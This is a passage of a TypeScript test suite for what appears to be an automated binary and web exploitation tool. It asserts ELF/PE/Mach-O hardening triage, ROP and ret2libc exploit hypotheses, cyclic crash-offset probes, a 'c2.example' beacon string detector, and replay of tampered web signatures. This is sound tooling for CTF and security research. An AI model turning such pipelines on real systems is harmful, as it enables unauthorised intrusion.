		expect(report.summary.anchors).toContain("native ROP/gadget anchors");
		expect(report.summary.anchors).toContain("native exploit hypothesis anchors");
		expect(report.summary.anchors).toContain("native primitive claim anchors");
		expect(report.nextQueue.some((command) => command.includes("native-elf-hardening.json"))).toBe(true);
		expect(report.nextQueue.some((command) => command.includes("dynamic.imports/relocations"))).toBe(true);
		expect(report.nextQueue.some((command) => command.includes("native-static-triage.json"))).toBe(true);
		expect(report.nextQueue.some((command) => command.includes("native-exploit-hypotheses.json"))).toBe(true);
		expect(report.nextQueue.some((command) => command.includes("native-primitive-claims.json"))).toBe(true);
		expect(report.nextQueue.some((command) => command.includes("claimLedger"))).toBe(true);
		expect(report.nextQueue.some((command) => command.includes("gadgetQuicklook"))).toBe(true);
		const summaryPath = join(report.artifactDir, "native-elf-hardening.json");
		const staticPath = join(report.artifactDir, "native-static-triage.json");
		const hypothesesPath = join(report.artifactDir, "native-exploit-hypotheses.json");
		const primitiveClaimsPath = join(report.artifactDir, "native-primitive-claims.json");
		expect(existsSync(summaryPath)).toBe(true);
		expect(existsSync(staticPath)).toBe(true);
		expect(existsSync(hypothesesPath)).toBe(true);
		expect(existsSync(primitiveClaimsPath)).toBe(true);
		expect(statSync(summaryPath).mode & 0o777).toBe(0o600);
		expect(statSync(staticPath).mode & 0o777).toBe(0o600);
		expect(statSync(hypothesesPath).mode & 0o777).toBe(0o600);
		expect(statSync(primitiveClaimsPath).mode & 0o777).toBe(0o600);
		const hardening = JSON.parse(readFileSync(summaryPath, "utf8")) as {
			elf: { class: number; machine: string; type: string };
			hardening: {
				pie: boolean;
				nx: boolean;
				relro: boolean;
				relroLevel: string;
				bindNow: boolean;
				canary: boolean;
				fortify: boolean;
				stackExecutable: boolean;
				needed: string[];
			};
			dynamic: {
				symbolCount: number;
				needed: string[];
				imports: Array<{ name: string; imported: boolean; type: string; bind: string }>;
				relocations: Array<{ table: string; typeName: string; symbol: string; offset: string }>;
				risks: string[];
			};
			risk: string[];
		};
		expect(hardening.elf).toMatchObject({ class: 64, machine: "x86-64", type: "DYN" });
		expect(hardening.hardening).toMatchObject({
			pie: true,
			nx: true,
			relro: true,
			relroLevel: "full",
			bindNow: true,
			canary: true,
			fortify: true,
			stackExecutable: false,
		});
		expect(hardening.hardening.needed).toContain("libc.so.6");
		expect(hardening.dynamic.symbolCount).toBeGreaterThanOrEqual(5);
		expect(hardening.dynamic.imports).toEqual(
			expect.arrayContaining([
				expect.objectContaining({ name: "gets", imported: true, type: "FUNC", bind: "GLOBAL" }),
				expect.objectContaining({ name: "system", imported: true, type: "FUNC", bind: "GLOBAL" }),
				expect.objectContaining({ name: "__stack_chk_fail", imported: true }),
			]),
		);
		expect(hardening.dynamic.relocations).toEqual(
			expect.arrayContaining([
				expect.objectContaining({
					table: "plt",
					typeName: "R_X86_64_JUMP_SLOT",
					symbol: "gets",
					offset: "0x404000",
				}),
				expect.objectContaining({
					table: "plt",
					typeName: "R_X86_64_JUMP_SLOT",
					symbol: "system",
					offset: "0x404008",
				}),
			]),
		);
		expect(hardening.dynamic.risks).toEqual(
			expect.arrayContaining([
				"elf-unsafe-import-surface",
				"elf-command-exec-import-surface",
				"elf-plt-relocation-surface",
			]),
		);
		expect(hardening.risk).toEqual([]);
		const staticTriage = JSON.parse(readFileSync(staticPath, "utf8")) as {
			signals: {
				unsafeInput: Array<{ match: string; text: string }>;
				commandExec: Array<{ match: string; text: string }>;
				formatStrings: Array<{ match: string; text: string }>;
				shellPaths: Array<{ text: string }>;
				urls: Array<{ text: string }>;
			};
			gadgetQuicklook: {
				architecture: { format: string; arch: string };
				gadgetCount: number;
				gadgets: Record<string, { count: number; samples: Array<{ offsetHex: string; gadget: string }> }>;
				risks: string[];
				hints: string[];
			};
			risks: string[];
		};
		expect(staticTriage.signals.unsafeInput.some((row) => row.match === "gets")).toBe(true);
		expect(staticTriage.signals.commandExec.some((row) => row.match === "system")).toBe(true);
		expect(staticTriage.signals.formatStrings.some((row) => row.text.includes("%n"))).toBe(true);
		expect(staticTriage.signals.shellPaths.some((row) => row.text.includes("/bin/sh"))).toBe(true);
		expect(staticTriage.signals.urls.some((row) => row.text.includes("http://c2.example/p"))).toBe(true);
		expect(staticTriage.gadgetQuicklook.architecture).toMatchObject({ format: "ELF", arch: "x86-64" });
		expect(staticTriage.gadgetQuicklook.gadgets["pop rdi; ret"]).toMatchObject({
			count: 1,
			samples: [expect.objectContaining({ offsetHex: "0x640", gadget: "pop rdi; ret" })],
		});
		expect(staticTriage.gadgetQuicklook.gadgets["syscall; ret"]).toMatchObject({
			count: 1,
			samples: [expect.objectContaining({ gadget: "syscall; ret" })],
		});
		expect(staticTriage.gadgetQuicklook.risks).toEqual(
			expect.arrayContaining([
				"native-rop-gadget-signal",
				"native-ret2libc-primitive-signal",
				"native-syscall-rop-primitive-signal",
				"native-stack-pivot-gadget-signal",
			]),
		);
		expect(staticTriage.gadgetQuicklook.hints.some((hint) => hint.includes("ret2libc-candidate"))).toBe(true);
		expect(staticTriage.risks).toEqual(
			expect.arrayContaining([
				"unsafe-input-sink-signal",
				"command-execution-sink-signal",
				"format-string-signal",
				"network-or-c2-string-signal",
				"crypto-codec-transform-signal",
				"secret-or-flag-string-signal",
				"native-rop-gadget-signal",
				"native-ret2libc-primitive-signal",
			]),
		);
		const hypotheses = JSON.parse(readFileSync(hypothesesPath, "utf8")) as {
			evidence: { artifacts: string[]; imports: string[]; gadgetRisks: string[] };
			hypotheses: Array<{ id: string; priority: string; evidence: string[]; verify: string[]; blockers: string[] }>;
		};
		expect(hypotheses.evidence.artifacts).toEqual(
			expect.arrayContaining([
				"native-elf-hardening.json",
				"native-static-triage.json",
				"native-replay-verifier.py",
			]),
		);
		expect(hypotheses.evidence.imports).toEqual(expect.arrayContaining(["gets", "system"]));
		expect(hypotheses.evidence.gadgetRisks).toContain("native-ret2libc-primitive-signal");
		expect(hypotheses.hypotheses).toEqual(
			expect.arrayContaining([
				expect.objectContaining({
					id: "ret2libc-system-binsh",
					priority: "medium",
					evidence: expect.arrayContaining(["native-static-triage.json:gadgetQuicklook.pop rdi; ret"]),
				}),
				expect.objectContaining({
					id: "syscall-rop-chain",
					verify: expect.arrayContaining(["Confirm register-pop coverage for target syscall ABI."]),
				}),
				expect.objectContaining({
					id: "plt-got-resolution-surface",
					blockers: expect.arrayContaining([
						"Full RELRO: GOT overwrite path unlikely; use leak/ret2libc instead.",
					]),
				}),
			]),
		);
		const primitiveClaims = JSON.parse(readFileSync(primitiveClaimsPath, "utf8")) as {
			proofReady: boolean;
			exploitProofReady: boolean;
			claimLedger: Array<{ claimType: string; verdict: string; evidenceBinding: Record<string, unknown> }>;
			promotionReport: { promotedClaims: Array<{ claimType: string }>; blockers: string[] };
			repairQueue: Array<{ blocker: string }>;
		};
		expect(JSON.stringify(primitiveClaims)).not.toContain("flag{demo}");
		expect(primitiveClaims.proofReady).toBe(true);
		expect(primitiveClaims.exploitProofReady).toBe(false);
		expect(
			primitiveClaims.claimLedger.some(
				(claim) => claim.claimType === "native-unsafe-import-surface" && claim.verdict === "promoted",
			),
		).toBe(true);
		expect(
			primitiveClaims.claimLedger.some(
				(claim) => claim.claimType === "native-ret2libc-surface" && claim.verdict === "promoted",
			),
		).toBe(true);
		expect(
			primitiveClaims.claimLedger.some(
				(claim) => claim.claimType === "native-syscall-rop-surface" && claim.verdict === "promoted",
			),
		).toBe(true);
		expect(
			primitiveClaims.claimLedger.some(
				(claim) => claim.claimType === "native-format-string-surface" && claim.verdict === "promoted",
			),
		).toBe(true);
		expect(
			primitiveClaims.claimLedger.some(
				(claim) => claim.claimType === "native-secret-flag-string-surface" && claim.verdict === "promoted",
			),
		).toBe(true);
		expect(primitiveClaims.promotionReport.blockers).toEqual(
			expect.arrayContaining(["missing-crash-or-behavior-differential", "need-pie-base-leak"]),
		);
		expect(primitiveClaims.repairQueue.map((row) => row.blocker)).toContain("missing-crash-or-behavior-differential");
		expect(collectTmp(agentDir)).toEqual([]);
	});

	it("summarizes PE imports and mitigations without depending on pefile", () => {
		const binary = join(workspace, "vuln.exe");
		writeFileSync(binary, minimalPe64ImportSample());

		const result = spawnSync(
			process.execPath,
			[ENGAGE, workspace, binary, "--no-mission", "--json", "--timeout-ms=5000"],
			{
				encoding: "utf8",
				env: {
					...process.env,
					REPI_CODING_AGENT_DIR: agentDir,
				},
				timeout: 15_000,
			},
		);
		expect(result.status, `${result.stderr}\n${result.stdout}`).toBe(0);
		const report = JSON.parse(result.stdout) as {
			artifactDir: string;
			target: { lane: string };
			commands: Array<{ id: string; stdout: string }>;
			nextQueue: string[];
			summary: { anchors: string[] };
		};
		expect(report.target.lane).toBe("native-pwn");
		expect(report.commands.map((row) => row.id)).toContain("native-pe-quicklook");
		expect(report.commands.find((row) => row.id === "native-pe-quicklook")?.stdout).toContain(
			"repi-native-pe-quicklook",
		);
		expect(report.summary.anchors).toContain("native PE/import anchors");
		expect(report.nextQueue.some((command) => command.includes("native-pe-quicklook.json"))).toBe(true);
		const summaryPath = join(report.artifactDir, "native-pe-quicklook.json");
		expect(existsSync(summaryPath)).toBe(true);
		expect(statSync(summaryPath).mode & 0o777).toBe(0o600);
		const quicklook = JSON.parse(readFileSync(summaryPath, "utf8")) as {
			pe: { format: string; machine: string; subsystem: string };
			mitigations: { dynamicBase: boolean; nx: boolean; guardCf: boolean; highEntropyVa: boolean };
			imports: Array<{ dll: string; functions: string[] }>;
			suspiciousImports: Array<{ dll: string; name: string }>;
			risks: string[];
		};
		expect(quicklook.pe).toMatchObject({ format: "PE32+", machine: "x86-64", subsystem: "windows-cui" });
		expect(quicklook.mitigations).toMatchObject({
			dynamicBase: true,
			nx: true,
			guardCf: true,
			highEntropyVa: true,
		});
		expect(quicklook.imports[0]).toMatchObject({
			dll: "KERNEL32.dll",
			functions: expect.arrayContaining(["VirtualAlloc", "CreateRemoteThread"]),
		});
		expect(quicklook.suspiciousImports).toEqual(
			expect.arrayContaining([
				expect.objectContaining({ dll: "KERNEL32.dll", name: "VirtualAlloc" }),
				expect.objectContaining({ dll: "KERNEL32.dll", name: "CreateRemoteThread" }),
			]),
		);
		expect(quicklook.risks).toContain("suspicious-import-surface");
		expect(collectTmp(agentDir)).toEqual([]);
	});

	it("summarizes Mach-O load commands and dyld hijack surfaces without otool", () => {
		const binary = join(workspace, "demo.macho");
		writeFileSync(binary, minimalMachO64());

		const result = spawnSync(
			process.execPath,
			[ENGAGE, workspace, binary, "--no-mission", "--json", "--timeout-ms=5000"],
			{
				encoding: "utf8",
				env: {
					...process.env,
					REPI_CODING_AGENT_DIR: agentDir,
				},
				timeout: 15_000,
			},
		);
		expect(result.status, `${result.stderr}\n${result.stdout}`).toBe(0);
		const report = JSON.parse(result.stdout) as {
			artifactDir: string;
			target: { lane: string };
			commands: Array<{ id: string; stdout: string }>;
			nextQueue: string[];
			summary: { anchors: string[] };
		};
		expect(report.target.lane).toBe("native-pwn");
		expect(report.commands.map((row) => row.id)).toContain("native-macho-quicklook");
		expect(report.commands.find((row) => row.id === "native-macho-quicklook")?.stdout).toContain(
			"repi-native-macho-quicklook",
		);
		expect(report.summary.anchors).toContain("native Mach-O anchors");
		expect(report.summary.anchors).toContain("native Mach-O symbol anchors");
		expect(report.nextQueue.some((command) => command.includes("native-macho-quicklook.json"))).toBe(true);
		const summaryPath = join(report.artifactDir, "native-macho-quicklook.json");
		expect(existsSync(summaryPath)).toBe(true);
		expect(statSync(summaryPath).mode & 0o777).toBe(0o600);
		const quicklook = JSON.parse(readFileSync(summaryPath, "utf8")) as {
			macho: { format: string; cpu: string; fileType: string };
			dylibs: Array<{ name: string }>;
			rpaths: string[];
			codeSignature: { dataOffset: number; dataSize: number } | null;
			entry: { entryOffset: number; stackSize: number } | null;
			buildVersion: { platform: string; minos: string; sdk: string } | null;
			symbols: {
				nsyms: number;
				sampled: Array<{ name: string }>;
				signals: {
					dangerous: Array<{ name: string }>;
					dynamicLoader: Array<{ name: string }>;
					objcSwift: Array<{ name: string }>;
					cryptoNetwork: Array<{ name: string }>;
				};
			} | null;
			risks: string[];
		};
		expect(quicklook.macho).toMatchObject({ format: "Mach-O 64-bit", cpu: "x86-64", fileType: "executable" });
		expect(quicklook.dylibs[0]).toMatchObject({ name: "/usr/lib/libSystem.B.dylib" });
		expect(quicklook.rpaths).toContain("@executable_path/Frameworks");
		expect(quicklook.codeSignature?.dataOffset).toBeGreaterThan(0);
		expect(quicklook.entry?.entryOffset).toBe(0xf00);
		expect(quicklook.buildVersion).toMatchObject({ platform: "macOS", minos: "13.0.0", sdk: "14.0.0" });
		expect(quicklook.symbols?.nsyms).toBe(7);
		expect(quicklook.symbols?.sampled.map((row) => row.name)).toEqual(
			expect.arrayContaining(["_main", "_system", "_dlopen", "_objc_msgSend", "_SecTrustEvaluate"]),
		);
		expect(quicklook.symbols?.signals.dangerous.map((row) => row.name)).toContain("_system");
		expect(quicklook.symbols?.signals.dynamicLoader.map((row) => row.name)).toContain("_dlopen");
		expect(quicklook.symbols?.signals.objcSwift.map((row) => row.name)).toEqual(
			expect.arrayContaining(["_objc_msgSend", "_$s4Demo6verifyyyF"]),
		);
		expect(quicklook.symbols?.signals.cryptoNetwork.map((row) => row.name)).toEqual(
			expect.arrayContaining(["_SecTrustEvaluate", "_NSURLSession"]),
		);
		expect(quicklook.risks).toContain("rpath-dylib-hijack-surface");
		expect(quicklook.risks).toContain("macho-dangerous-symbol-surface");
		expect(quicklook.risks).toContain("macho-dynamic-loader-symbol-surface");
		expect(quicklook.risks).toContain("macho-objc-swift-metadata-signal");
		expect(quicklook.risks).toContain("macho-crypto-network-symbol-signal");
		expect(quicklook.risks).not.toContain("missing-code-signature-command");
		expect(collectTmp(agentDir)).toEqual([]);
	});

	it("summarizes fat Mach-O slices and preserves slice/file offsets", () => {
		const binary = join(workspace, "universal.macho");
		writeFileSync(binary, minimalFatMachO64());

		const result = spawnSync(
			process.execPath,
			[ENGAGE, workspace, binary, "--no-mission", "--json", "--timeout-ms=5000"],
			{
				encoding: "utf8",
				env: {
					...process.env,
					REPI_CODING_AGENT_DIR: agentDir,
				},
				timeout: 15_000,
			},
		);
		expect(result.status, `${result.stderr}\n${result.stdout}`).toBe(0);
		const report = JSON.parse(result.stdout) as {
			artifactDir: string;
			commands: Array<{ id: string; stdout: string }>;
			nextQueue: string[];
			summary: { anchors: string[] };
		};
		expect(report.commands.map((row) => row.id)).toContain("native-macho-quicklook");
		expect(report.summary.anchors).toContain("native Mach-O anchors");
		expect(report.nextQueue.some((command) => command.includes("native-macho-quicklook.json"))).toBe(true);
		const quicklook = JSON.parse(readFileSync(join(report.artifactDir, "native-macho-quicklook.json"), "utf8")) as {
			fat: {
				format: string;
				architectureCount: number;
				selectedIndex: number;
				selectedOffset: number;
				architectures: Array<{ cpu: string; offset: number; size: number }>;
			};
			macho: { format: string; sliceOffset: number; sliceSize: number };
			codeSignature: { dataOffset: number; fileOffset: number };
			symbols: { fileSymoff: number; fileStroff: number };
		};
		expect(quicklook.fat).toMatchObject({
			format: "fat Mach-O",
			architectureCount: 1,
			selectedIndex: 0,
			selectedOffset: 0x100,
		});
		expect(quicklook.fat.architectures[0]).toMatchObject({ cpu: "x86-64", offset: 0x100 });
		expect(quicklook.macho).toMatchObject({ format: "Mach-O 64-bit", sliceOffset: 0x100 });
		expect(quicklook.codeSignature.fileOffset).toBe(quicklook.codeSignature.dataOffset + 0x100);
		expect(quicklook.symbols.fileSymoff).toBeGreaterThan(0x100);
		expect(quicklook.symbols.fileStroff).toBeGreaterThan(quicklook.symbols.fileSymoff);
		expect(collectTmp(agentDir)).toEqual([]);
	});

	it("runs bounded native execution probes and records crash evidence", () => {
		const binary = join(workspace, "crashy.elf");
		writeFileSync(
			binary,
			`#!/usr/bin/env bash
IFS= read -r input || true
if [ "\${#input}" -gt 100 ]; then
  echo "simulated crash len=\${#input}"
  exit 139
fi
echo "ready"
`,
		);
		chmodSync(binary, 0o755);

		const result = spawnSync(
			process.execPath,
			[ENGAGE, workspace, binary, "--no-mission", "--json", "--timeout-ms=5000"],
			{
				encoding: "utf8",
				env: {
					...process.env,
					REPI_CODING_AGENT_DIR: agentDir,
				},
				timeout: 15_000,
			},
		);
		expect(result.status, `${result.stderr}\n${result.stdout}`).toBe(0);
		const report = JSON.parse(result.stdout) as {
			artifactDir: string;
			target: { lane: string };
			commands: Array<{ id: string; stdout: string }>;
			nextQueue: string[];
			summary: { anchors: string[] };
		};
		expect(report.target.lane).toBe("native-pwn");
		expect(report.commands.map((row) => row.id)).toContain("native-run-empty");
		expect(report.commands.map((row) => row.id)).toContain("native-run-cyclic");
		expect(report.commands.map((row) => row.id)).toContain("native-replay-verifier-artifact");
		expect(report.commands.map((row) => row.id)).toContain("native-gdb-trace-artifact");
		expect(report.commands.map((row) => row.id)).toContain("native-exploit-hypotheses");
		expect(report.commands.map((row) => row.id)).toContain("native-primitive-claims");
		expect(report.commands.map((row) => row.id)).toContain("proof-harness-plan");
		expect(report.commands.map((row) => row.id)).toContain("proof-harness-self-test");
		expect(report.commands.find((row) => row.id === "native-run-empty")?.stdout).toContain("mode=empty exit=0");
		expect(report.commands.find((row) => row.id === "native-run-cyclic")?.stdout).toContain("crash_signal=SIGSEGV");
		expect(report.summary.anchors).toContain("dynamic execution/crash anchors");
		expect(report.summary.anchors).toContain("native exploit hypothesis anchors");
		expect(report.summary.anchors).toContain("native primitive claim anchors");
		expect(report.summary.anchors).toContain("proof harness/self-test anchors");
		const verifierPath = join(report.artifactDir, "native-replay-verifier.py");
		const gdbPath = join(report.artifactDir, "native-gdb-trace.gdb");
		const cyclicPayloadPath = join(report.artifactDir, "native-cyclic-payload.bin");
		const cyclicOffsetPath = join(report.artifactDir, "native-cyclic-offset.py");
		const hypothesesPath = join(report.artifactDir, "native-exploit-hypotheses.json");
		const primitiveClaimsPath = join(report.artifactDir, "native-primitive-claims.json");
		const proofMatrixPath = join(report.artifactDir, "proof-matrix.json");
		const proofHarnessPath = join(report.artifactDir, "proof-harness.mjs");
		expect(existsSync(verifierPath)).toBe(true);
		expect(existsSync(gdbPath)).toBe(true);
		expect(existsSync(cyclicPayloadPath)).toBe(true);
		expect(existsSync(cyclicOffsetPath)).toBe(true);
		expect(existsSync(hypothesesPath)).toBe(true);
		expect(existsSync(primitiveClaimsPath)).toBe(true);
		expect(existsSync(proofMatrixPath)).toBe(true);
		expect(existsSync(proofHarnessPath)).toBe(true);
		expect(statSync(verifierPath).mode & 0o777).toBe(0o700);
		expect(statSync(gdbPath).mode & 0o777).toBe(0o600);
		expect(statSync(cyclicPayloadPath).mode & 0o777).toBe(0o600);
		expect(statSync(cyclicOffsetPath).mode & 0o777).toBe(0o700);
		expect(statSync(primitiveClaimsPath).mode & 0o777).toBe(0o600);
		expect(statSync(proofMatrixPath).mode & 0o777).toBe(0o600);
		expect(statSync(proofHarnessPath).mode & 0o777).toBe(0o700);
		const gdbScript = readFileSync(gdbPath, "utf8");
		expect(gdbScript).toContain("info registers");
		expect(gdbScript).toContain("bt");
		expect(gdbScript).toContain("native-cyclic-payload.bin");
		const proofMatrix = JSON.parse(readFileSync(proofMatrixPath, "utf8")) as {
			artifacts: Array<{ relPath: string }>;
			liveChecks: Array<{ id: string; selfTest: boolean }>;
		};
		expect(proofMatrix.artifacts.map((row) => row.relPath)).toContain("native-replay-verifier.py");
		expect(proofMatrix.artifacts.map((row) => row.relPath)).toContain("native-primitive-claims.json");
		expect(proofMatrix.liveChecks).toEqual(
			expect.arrayContaining([
				expect.objectContaining({ id: "native-cyclic-offset-self-test", selfTest: true }),
				expect.objectContaining({ id: "native-replay-verifier-live", selfTest: false }),
			]),
		);
		expect(report.nextQueue.some((command) => command.includes("native-replay-verifier.py"))).toBe(true);
		expect(report.nextQueue.some((command) => command.includes("stdin/argv/env I/O contract"))).toBe(true);
		expect(report.nextQueue.some((command) => command.includes("native-cyclic-offset.py"))).toBe(true);
		expect(report.nextQueue.some((command) => command.includes("native-exploit-hypotheses.json"))).toBe(true);
		expect(report.nextQueue.some((command) => command.includes("native-primitive-claims.json"))).toBe(true);
		expect(
			report.nextQueue.some((command) => command.includes("proof-harness.mjs") && command.includes("--self-test")),
		).toBe(true);
		expect(report.summary.anchors).toContain("gdb/cyclic offset artifacts");
		if (spawnSync("bash", ["-lc", "command -v gdb >/dev/null 2>&1"]).status === 0) {
			expect(report.nextQueue.some((command) => command.includes("native-gdb-trace.gdb"))).toBe(true);
		}
		const proofHarness = spawnSync(process.execPath, [proofHarnessPath, "--self-test"], {
			encoding: "utf8",
			timeout: 15_000,
		});
		expect(proofHarness.status, `${proofHarness.stderr}\n${proofHarness.stdout}`).toBe(0);
		expect(proofHarness.stdout).toContain('"proofReady": true');
		expect(proofHarness.stdout).toContain("native-cyclic-offset-self-test");
		const cyclicNeedle = readFileSync(cyclicPayloadPath).subarray(30, 34).toString("hex");
		const offset = spawnSync("python3", [cyclicOffsetPath, `hex:${cyclicNeedle}`], {
			encoding: "utf8",
			timeout: 15_000,
		});
		expect(offset.status, `${offset.stderr}\n${offset.stdout}`).toBe(0);
		expect(offset.stdout).toContain('"offset": 30');
		const verifier = spawnSync("python3", [verifierPath, binary], {
			encoding: "utf8",
			timeout: 15_000,
			env: { ...process.env, REPI_NATIVE_RUNS: "1", REPI_NATIVE_TIMEOUT: "2" },
		});
		expect(verifier.status, `${verifier.stderr}\n${verifier.stdout}`).toBe(0);
		expect(verifier.stdout).toContain('"case": "cyclic-1"');
		expect(verifier.stdout).toContain('"case": "argv-cyclic"');
		expect(verifier.stdout).toContain('"ioContract"');
		expect(verifier.stdout).toContain('"exit": 139');
		const hypotheses = JSON.parse(readFileSync(hypothesesPath, "utf8")) as {
			hypotheses: Array<{ id: string; verify: string[] }>;
		};
		expect(hypotheses.hypotheses).toEqual(
			expect.arrayContaining([
				expect.objectContaining({
					id: "cyclic-crash-control-proof",
					verify: expect.arrayContaining([
						expect.stringContaining("native-replay-verifier.py"),
						expect.stringContaining("native-gdb-trace.gdb"),
						expect.stringContaining("native-cyclic-offset.py"),
					]),
				}),
			]),
		);
		const primitiveClaims = JSON.parse(readFileSync(primitiveClaimsPath, "utf8")) as {
			proofReady: boolean;
			exploitProofReady: boolean;
			claimLedger: Array<{ claimType: string; verdict: string; evidenceBinding: Record<string, unknown> }>;
			composedPaths: Array<{ claimType: string; verdict: string }>;
			promotionReport: { promotedClaims: Array<{ claimType: string }> };
		};
		expect(primitiveClaims.proofReady).toBe(true);
		expect(primitiveClaims.exploitProofReady).toBe(true);
		expect(
			primitiveClaims.claimLedger.some(
				(claim) => claim.claimType === "native-crash-replay-signal" && claim.verdict === "promoted",
			),
		).toBe(true);
		expect(
			primitiveClaims.claimLedger.some(
				(claim) => claim.claimType === "native-cyclic-crash-control-claim" && claim.verdict === "promoted",
			),
		).toBe(true);
		expect(
			primitiveClaims.claimLedger.some(
				(claim) => claim.claimType === "native-io-contract-harness" && claim.verdict === "promoted",
			),
		).toBe(true);
		expect(
			primitiveClaims.composedPaths.some(
				(claim) => claim.claimType === "native-exploit-proof-path" && claim.verdict === "promoted",
			),
		).toBe(true);
		expect(
			primitiveClaims.promotionReport.promotedClaims.some(
				(claim) => claim.claimType === "native-exploit-proof-path",
			),
		).toBe(true);
		expect(collectTmp(agentDir)).toEqual([]);
	});

	it("fetches and scans served JavaScript assets for signing/runtime anchors", async () => {
		const server = spawn(
			process.execPath,
			[
				"-e",
				`const {createServer}=require("node:http");
const server=createServer((request,response)=>{
	if(request.url==="/app.js"){
		response.writeHead(200,{"content-type":"application/javascript"});
		response.end("fetch('/api', {headers:{Authorization:'Bearer demo'}});\\n//# sourceMappingURL=/app.js.map\\n");
		return;
	}
	if(request.url==="/app.js.map"){
		response.writeHead(200,{"content-type":"application/json"});
		response.end(JSON.stringify({version:3,sources:["src/signer.ts"],sourcesContent:["async function signWithPermutation(tableKey){ return crypto.subtle.digest('SHA-256', new TextEncoder().encode(tableKey)); }\\nfetch('/api/signed/proof?timestamp=1&signature=demo');\\n"],mappings:""}));
		return;
	}
	response.writeHead(200,{"content-type":"text/html"});
	response.end("<html><form action=\\"/api/login\\" method=\\"post\\"></form><script src=\\"/app.js\\"></script></html>");
});
server.listen(0,"127.0.0.1",()=>console.log(server.address().port));`,
			],
			{ stdio: ["ignore", "pipe", "pipe"] },
		);
		const port = await new Promise<string>((resolve, reject) => {
			const timer = setTimeout(() => reject(new Error("server did not start")), 5000);
			server.stdout.once("data", (chunk) => {
				clearTimeout(timer);
				resolve(String(chunk).trim());
			});
			server.once("error", reject);
			server.once("exit", (code) => {
				if (code !== null && code !== 0) reject(new Error(`server exited ${code}`));
			});
		});
		try {
			const url = `http://127.0.0.1:${port}/`;
			const result = spawnSync(
				process.execPath,
				[ENGAGE, workspace, url, "--no-mission", "--no-write", "--json", "--timeout-ms=5000"],
				{
					encoding: "utf8",
					env: {
						...process.env,
						REPI_CODING_AGENT_DIR: agentDir,
					},
					timeout: 15_000,
				},
			);
			expect(result.status, `${result.stderr}\n${result.stdout}`).toBe(0);
			const report = JSON.parse(result.stdout) as {
				commands: Array<{ id: string; stdout: string }>;
				summary: { anchors: string[] };
			};
			expect(report.commands.map((row) => row.id)).toContain("web-js-asset-1-fetch");
			expect(report.commands.map((row) => row.id)).toContain("web-js-asset-1-sourcemap-fetch");
			expect(report.commands.map((row) => row.id)).toContain("web-js-asset-1-sourcemap-scan");
			expect(report.commands.map((row) => row.id)).toContain("web-js-asset-scan");
			expect(report.commands.map((row) => row.id)).toContain("web-js-signature-control-plan");
			expect(report.commands.map((row) => row.id)).toContain("web-js-signature-control-harness");
			expect(report.commands.map((row) => row.id)).toContain("web-runtime-capture-plan");
			expect(report.commands.map((row) => row.id)).toContain("web-runtime-capture-harness");
			expect(report.commands.map((row) => row.id)).toContain("web-runtime-replay-plan");
			expect(report.commands.map((row) => row.id)).toContain("web-runtime-replay-verifier");
			expect(report.commands.map((row) => row.id)).toContain("web-signer-rebuild-workbench-plan");
			expect(report.commands.map((row) => row.id)).toContain("web-signer-rebuild-workbench");
			expect(report.commands.map((row) => row.id)).toContain("web-endpoint-scan");
			expect(report.commands.map((row) => row.id)).toContain("web-discovery-matrix");
			expect(report.commands.map((row) => row.id)).toContain("web-replay-matrix");
			expect(report.commands.find((row) => row.id === "web-endpoint-scan")?.stdout).toContain("/api/login");
			expect(report.commands.find((row) => row.id === "web-replay-matrix")?.stdout).toContain(
				"repi-web-replay-matrix",
			);
			expect(report.commands.find((row) => row.id === "web-js-asset-scan")?.stdout).toContain("crypto.subtle");
			expect(report.commands.find((row) => row.id === "web-js-asset-1-sourcemap-scan")?.stdout).toContain(
				"signWithPermutation",
			);
			expect(report.commands.find((row) => row.id === "web-js-signature-control-plan")?.stdout).toContain(
				"/api/signed/proof",
			);
			expect(report.commands.find((row) => row.id === "web-js-signature-control-plan")?.stdout).toContain(
				"missing-signature",
			);
			expect(report.commands.find((row) => row.id === "web-js-signature-control-plan")?.stdout).toContain(
				"policy_gap/inconclusive",
			);
			expect(report.commands.find((row) => row.id === "web-js-signature-control-harness")?.stdout).toContain(
				"assertPermutation",
			);
			expect(report.commands.find((row) => row.id === "web-js-signature-control-harness")?.stdout).toContain(
				"requiredControls",
			);
			expect(report.commands.find((row) => row.id === "web-runtime-capture-plan")?.stdout).toContain(
				"crypto.subtle.digest",
			);
			expect(report.commands.find((row) => row.id === "web-runtime-capture-harness")?.stdout).toContain(
				"XMLHttpRequest",
			);
			expect(report.commands.find((row) => row.id === "web-runtime-capture-harness")?.stdout).toContain("WebSocket");
			expect(report.commands.find((row) => row.id === "web-runtime-capture-harness")?.stdout).toContain(
				"crypto.subtle",
			);
			expect(report.commands.find((row) => row.id === "web-runtime-replay-plan")?.stdout).toContain(
				"captured-signed",
			);
			expect(report.commands.find((row) => row.id === "web-runtime-replay-verifier")?.stdout).toContain(
				"tampered-signature",
			);
			expect(report.commands.find((row) => row.id === "web-signer-rebuild-workbench-plan")?.stdout).toContain(
				"byteForByteRule",
			);
			expect(report.commands.find((row) => row.id === "web-signer-rebuild-workbench")?.stdout).toContain(
				"assertByteForByte",
			);
			expect(report.commands.find((row) => row.id === "web-signer-rebuild-workbench")?.stdout).toContain(
				"runCandidateRegression",
			);
			expect(report.summary.anchors).toContain("JS signing/runtime anchors");
			expect(report.summary.anchors).toContain("JS sourcemap reverse anchors");
			expect(report.summary.anchors).toContain("JS signature control anchors");
			expect(report.summary.anchors).toContain("browser runtime capture anchors");
			expect(report.summary.anchors).toContain("browser runtime replay verifier anchors");
			expect(report.summary.anchors).toContain("signer rebuild workbench anchors");
			expect(report.summary.anchors).toContain("route/API anchors");
			expect(report.summary.anchors).toContain("web discovery anchors");
			expect(report.summary.anchors).toContain("HTTP replay matrix anchors");
			expect(existsSync(agentDir)).toBe(false);
		} finally {
			server.kill("SIGTERM");
			await new Promise<void>((resolve) => server.once("exit", () => resolve()));
		}
	});

	it("passes classified route hints into live swarm dispatch", () => {
		const scriptDir = join(workspace, "scripts", "reverse-agent");
		mkdirSync(scriptDir, { recursive: true });
		writeFileSync(
			join(scriptDir, "repi-swarm-llm-run.mjs"),
			`#!/usr/bin/env node\nconsole.log(JSON.stringify({ok:true,args:process.argv.slice(2)}));\n`,
		);
		const targetDir = join(workspace, "target-app");
		mkdirSync(targetDir, { recursive: true });
		writeFileSync(join(targetDir, "package.json"), JSON.stringify({ scripts: { build: "vite build" } }));
		writeFileSync(join(targetDir, "app.js"), "fetch('/api/signed?timestamp=1&signature=demo')\n");

		const result = spawnSync(
			process.execPath,
			[
				ENGAGE,
				workspace,
				targetDir,
				"--no-mission",
				"--swarm",
				"--provider",
				"kimchi",
				"--model",
				"kimi-k2.7",
